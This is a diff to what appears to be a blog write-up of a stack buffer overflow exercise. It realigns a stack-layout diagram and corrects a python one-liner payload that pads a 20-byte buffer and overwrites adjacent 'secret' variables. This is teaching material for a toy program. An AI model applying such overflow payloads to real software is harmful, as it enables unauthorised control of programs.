@@ -109,7 +109,7 @@ If we were to draw it, after initialisation of all local variables the stack wil
 {%codeblock%}
 ** Assuming each "frame" is 4 bytes.
 
-                                                       0x00000000 (lower memory addresses)
+                                      0x00000000 (lower memory addresses)
 +----------+        RBP-28
 |    SRC   |
 |----------|
@@ -131,7 +131,7 @@ If we were to draw it, after initialisation of all local variables the stack wil
 |----------|        RBP-4
 | SECRET_0 |
 +----------+    <== RBP
-                                                       0xFFFFFFFF (higher memory addresses)
+                                      0xFFFFFFFF (higher memory addresses)
 {% endcodeblock %}
 
 Now, having that information, we can easily deduct that in order to overflow our variables, we need to first fill up the buffer of `dest` with `20 bytes` of garbage, next `4 bytes` would be our `secret_2`, followed by `4 bytes` for `secret_1` and last `4 bytes` for `secret_0`.
@@ -153,8 +153,8 @@ Exploit
 Let's put our exploit to test! The payload we'll be sending is:
 
 {%codeblock%}
-root@debian:~# python -c 'print "A" * 20 + "n4m3" + "t0k3" + "0"'
-AAAAAAAAAAAAAAAAAAAAn4m3t0k30
+root@debian:~# python -c 'print "A" * 20 + "3m4n" + "3k0t" + "0"'
+AAAAAAAAAAAAAAAAAAAA3m4n3k0t0
 {% endcodeblock %}
 
 And that's how it should look on the stack:
